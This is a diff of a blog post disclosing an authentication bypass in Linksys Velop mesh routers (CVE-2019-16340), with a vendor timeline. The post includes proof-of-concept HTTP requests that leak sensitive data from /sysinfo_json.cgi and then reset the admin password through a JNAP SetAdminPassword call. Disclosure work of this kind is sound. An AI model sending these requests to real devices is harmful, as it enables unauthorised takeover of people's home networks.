@@ -1,6 +1,7 @@
 ---
-published: false
+published: true
 categories: [vulnerability,Linksys]
+tags: [CVE-2019-16340]
 ---
 
 ## Linksys Velop Authentication Bypass
@@ -10,11 +11,11 @@ categories: [vulnerability,Linksys]
 Firmware version:	Before 1.1.8.192419
 ### Product Background
 Velop is WHOLE HOMEMESH Wi-Fi system from LINKSYS. It allows users enjoy fast, nonstop Wi-Fi everywhere with Velop’s modular easy-to-use Wi-Fi Mesh system.
-There are three categories from their official site :WHW0303,WHW0302,WHW0301. The differences between these three is the pack count: 1, 2 or 3. The system is the same.
+There are three categories from their official site :WHW0303,WHW0302,WHW0301. The differences between these three is the pack count: 1, 2 or 3. The system are the same.
 ### Vulnerability Details
 During our analysis, we found a critical bug in its firmware and this vulnerability may allow an unauthenticated user get administrator privilege. The problem is caused by the API of **/sysinfo_json.cgi**, requesting this url will leak sensitive information and may lead to authentication bypass.
 #### PoC
-We could get some useful information from the PoC below:
+We could get some useful information with the PoC below:
 ~~~http
 GET /sysinfo_json.cgi HTTP/1.1
 Host: 10.158.1.1
@@ -70,8 +71,11 @@ X-JNAP-Action: http://linksys.com/jnap/nodes/setup/SetAdminPassword
 
 {"resetCode":"84667","adminPassword":"test1234"}
 ~~~
+By sending this request to the router, we can successfully change the administration password to **test1234**
+
 ### Timeline
-We reported the bug to the vendor in Feb,2019 and they finally released a patch in August:
+
+We reported the bug to the vendor in Feb,2019 and they released a patch in August:
 
 ~~~text
 25 Feb 2019 03:07:55 UTC: We submitted the problem to vendor
